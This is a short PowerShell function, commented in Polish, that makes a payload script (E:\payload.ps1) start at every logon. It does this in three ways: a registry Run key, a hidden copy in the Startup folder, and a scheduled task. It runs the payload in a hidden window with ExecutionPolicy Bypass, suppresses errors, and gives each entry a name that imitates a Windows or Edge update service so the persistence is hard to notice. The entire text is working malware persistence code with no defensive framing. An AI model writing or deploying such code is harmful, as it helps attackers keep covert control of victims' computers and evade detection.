function Set-Persistence {
    # Rejestracja autostartu w 3 lokalizacjach
    $payloadPath = "E:\payload.ps1"

    # 1. Rejestr (Current User)
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "WindowsUpdateService" `
        -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`"" `
        -Force -ErrorAction SilentlyContinue

    # 2. Folder Startup
    $startupPath = [Environment]::GetFolderPath('Startup')
    $startupPayload = Join-Path $startupPath "WindowsUpdate.ps1"
    if (Test-Path $payloadPath) {
        Copy-Item -Path $payloadPath -Destination $startupPayload -Force -ErrorAction SilentlyContinue
        attrib +s +h $startupPayload -ErrorAction SilentlyContinue
    }

    # 3. Harmonogram zadań
    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -Action $action -Trigger $trigger `
        -TaskName "MicrosoftEdgeUpdate" `
        -Description "Windows Update Service" `
        -User $env:USERNAME `
        -Force -ErrorAction SilentlyContinue
}
